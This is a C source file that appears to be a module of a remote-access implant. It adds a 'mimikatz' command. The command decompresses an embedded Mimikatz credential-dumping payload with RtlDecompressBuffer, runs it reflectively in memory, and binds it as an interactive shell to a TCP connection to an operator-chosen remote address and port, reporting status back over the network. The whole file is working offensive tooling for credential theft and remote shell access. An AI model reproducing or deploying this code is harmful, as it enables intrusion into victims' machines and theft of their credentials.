#include <stdio.h>

#include "mimikittenz.h"

#include "command.h"
#include "mimikatz.h"
#include "networking.h"
#include "process.h"
#include "utils.h"

static HANDLE g_hProcess = NULL;
static LPWSTR lpAddress = NULL;
static LPWSTR lpPort = NULL;

// Returns 0 on success, else error.
static void PrintHelp(void) {
	NetSend(L"\t\t.:: MIMIKATZ HELP ::.\n\n"
			L"Usage: mimikatz [help|status|start|stop] [address port]\n\n"
			L"\t%-12s:\tDisplay this menu.\n"
			L"\t%-12s:\tChecks the status of mimikatz.\n"
			L"\t%-12s:\tStarts mimikatz. Default server is %s:%s.\n"
			L"\t%-12s:\tStops mimikatz.\n\n"
			L"\n"
			L"\t%-12s:\tSpecify the remote address.\n"
			L"\t%-12s:\tSpecify the remote port.\n"
			L"\nExample:\n"
			L"\t\tmimikatz start 127.0.0.1 45872\n\n",
			OPTION_STRING_HELP,
			OPTION_STRING_STATUS,
			OPTION_STRING_START, MIMIKATZ_DEFAULT_ADDRESS, MIMIKATZ_DEFAULT_PORT,
			OPTION_STRING_STOP,
			L"address",
			L"port");
}

static void PrintStatus(void) {
	if (g_hProcess == NULL) {
		NetSend(L"\t\t.:: MIMIKATZ STATUS ::.\n\n"
				L"\t\tMimikatz is INACTIVE.\n\n");
	} else {
		NetSend(L"\t\t.:: MIMIKATZ STATUS ::.\n\n"
				L"\t\tMimikatz is ACTIVE.\n\n"
				L"\t%-12s:\t%s:%s\n"
				L"\t%-12s:\t0x%08x\n\n", 
				L"Remote", lpAddress, lpPort, 
				L"PID", GetProcessId(g_hProcess));
	}
}

static void MimikatzNetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	NetSend(L"%s: %s\n", MIMIKATZ_BANNER, szBuf);
}

static BOOL MimikatzStop(void) {
	BOOL bSuccess = TerminateProcess(g_hProcess, 1);
	if (bSuccess == FALSE) {
		MimikatzNetSend(L"Failed to terminate Mimikatz; error: <%lu>", GetLastError());
	} else {
		MimikatzNetSend(L"Successfully terminated Mimikatz.");
		CloseHandle(g_hProcess);
		g_hProcess = NULL;
	}

	return bSuccess;
}

BOOL MimikatzDecompressPayload(LPBYTE lpCompressed, ULONG nCompressedSize, LPBYTE *lpDecompressed) {
	// The decompression API function needs to be dynamically retrieved.
	NTSTATUS(NTAPI *fpRtlDecompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG)
		= (NTSTATUS(NTAPI *)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG))
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlDecompressBuffer");
	if (fpRtlDecompressBuffer == NULL) {
		MimikatzNetSend(L"Failed to obtain address for RtlDecompress Buffer; error: %lu", GetLastError());
		return FALSE;
	}

	// Freed by caller.
	*lpDecompressed = _HeapAlloc(HEAP_ZERO_MEMORY, dwMimikittenzPayloadOriginalSize);
	if (*lpDecompressed == NULL) {
		MimikatzNetSend(L"Failed to allocate data for decompression buffer; error: %lu", GetLastError());
		return FALSE;
	}

	ULONG uDecompressedSize = 0;
	NTSTATUS ntStatus = fpRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, (PUCHAR)*lpDecompressed, dwMimikittenzPayloadOriginalSize, (PUCHAR)lpCompressed, nCompressedSize, &uDecompressedSize);
	if (!NT_SUCCESS(ntStatus)) {
		_HeapFree(lpDecompressed);
		MimikatzNetSend(L"Failed to decompress Mimikatz payload; error: %lu", ntStatus);
		return FALSE;
	}

	return TRUE;
}

static void MimikatzStart(void) {
	SOCKET s = INVALID_SOCKET;
	ULONG uSuccess = TcpConnect(&s, lpAddress, lpPort);
	//do {
		if (uSuccess) {
			MimikatzNetSend(L"Failed to create a TCP connection; error: %lu", uSuccess);
			if (uSuccess != WSAETIMEDOUT && uSuccess != WSAECONNREFUSED) {
				if (s != INVALID_SOCKET) {
					CloseTcpSocket(s);
					return;
				}
			}
		}
		// TODO Fix sleep?
		//Sleep(5000);
	//} while (uSuccess == WSAETIMEDOUT || uSuccess == WSAECONNREFUSED);

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	uSuccess = -1;
	LPBYTE lpDecompressed = NULL;
	// Decompress the Mimikatz executable.
	if (MimikatzDecompressPayload(bMimikittenzPayload, sizeof(bMimikittenzPayload), &lpDecompressed) == TRUE) {
		// Run it refelectively.
		uSuccess = ProcessCreateInteractiveSocketShellReflective(s, lpDecompressed, L"", &pi);
		// Free the decompressed buffer since we no longer need it.
		_HeapFree(lpDecompressed);
	}

	g_hProcess = pi.hProcess;
	if (uSuccess == 0) {
		MimikatzNetSend(L"Successfully spawned mimikatz (PID: <0x%08x>).", GetProcessId(g_hProcess));
	} else {
		MimikatzNetSend(L"Failed to spawn mimikatz; error: %lu", GetLastError());
	}
	
	WaitForSingleObject(pi.hProcess, INFINITE);

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (s != INVALID_SOCKET) {
		CloseTcpSocket(s);
	}

	MimikatzNetSend(L"Mimikatz has been terminated.");
	// Don't forget to uninitialise after use so it can be set again.
	g_hProcess = NULL;
}


ULONG MimikatzMain(INT argc, LPWSTR *argv) {
	// Set default address and port.
	lpAddress = MIMIKATZ_DEFAULT_ADDRESS;
	lpPort = MIMIKATZ_DEFAULT_PORT;

	if (argc == 1) {
		PrintHelp();
	} else if (argc > 1) {
		if (!_wcsnicmp(argv[1], OPTION_STRING_HELP, wcslen(OPTION_STRING_HELP))) {
			PrintHelp();
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_STATUS, wcslen(OPTION_STRING_STATUS))) {
			PrintStatus();
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_STOP, wcslen(OPTION_STRING_STOP))) {
			// Check if there's anything to kill.
			if (g_hProcess != NULL) {
				MimikatzStop();
			} else {
				MimikatzNetSend(L"Nothing to kill.");
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_START, wcslen(OPTION_STRING_START))) {
			// Check for address and port parameters
			if (argc == 2) {
				goto spawn;
			} else if (argc < 4) {
				// Invalid arguments.
				MimikatzNetSend(L"Please provide an address and port.");
			} else {
				// Change remote address and port.
				lpAddress = argv[2];
				lpPort = argv[3];
				goto spawn;
			}
		} else {
			MimikatzNetSend(L"Bad argument(s).");
		}
	}

	return 0;

spawn:
	if (g_hProcess != NULL) {
		MimikatzNetSend(L"There is already an active mimikatz process (PID: <0x%08x>).", GetProcessId(g_hProcess));
		return 1;
	}

	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MimikatzStart, NULL, 0, NULL) == NULL) {
		MimikatzNetSend(L"Failed to create thread; error: %lu", GetLastError());
	}

	return 0;
}